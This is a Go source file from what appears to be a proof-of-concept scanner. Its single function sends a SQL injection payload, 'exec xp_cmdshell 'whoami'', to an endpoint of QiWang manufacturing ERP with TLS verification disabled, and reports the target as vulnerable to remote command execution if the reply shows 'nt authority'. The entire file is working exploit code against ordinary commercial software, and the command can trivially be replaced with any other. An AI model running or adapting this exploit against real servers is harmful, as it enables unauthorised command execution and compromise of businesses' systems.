package poc

import (
	"PocSir/config"
	"bytes"
	"crypto/tls"
	"io"
	"net/http"
	"strings"
	"time"
)

func QiWangERP_EXEC(target string) {
	pocUrl := target + "/mainFunctions/comboxstoreByListType.action"

	headers := map[string]string{
		"User-Agent":   getRandUa(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}
	execPoc := []byte(`comboxsql=exec xp_cmdshell 'whoami'`)
	req, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(execPoc))
	if err != nil {
		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}
	resp, err := client.Do(req)
	if err != nil {
		config.ErrMsg.Printf("[-]%s is timeout\n", target)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == http.StatusOK && strings.Contains(string(body), "nt authority") {
		config.Right.Printf("[+]%s存在企望制造 ERP comboxstore.action 远程命令执行漏洞\n", target)
		config.TextPut.Printf(string(body) + "\n")
	} else {
		config.ErrMsg.Printf("[-]%s不存在企望制造 ERP comboxstore.action 远程命令执行漏洞\n", target)
		//TextPut.Printf(string(body) + "\n")
	}
}
